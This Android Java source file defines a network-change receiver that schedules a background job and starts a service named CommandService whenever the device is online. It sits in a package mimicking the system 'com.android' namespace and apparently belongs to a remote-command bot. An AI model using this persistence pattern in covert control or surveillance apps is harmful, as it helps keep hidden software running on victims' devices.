package com.android.adobot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.android.adobot.job.CheckJob;

public class NetworkWatcher extends BroadcastReceiver {

    private Context context;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        System.out.print("Network Watcher running.............");

        CheckJob.scheduleJob();

        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = cm.getActiveNetworkInfo();
        if (info != null) {
            if (info.isConnected())
                startClient();
        }
    }

    void startClient() {
        Intent i = new Intent(context, CommandService.class);
        context.startService(i);
    }
}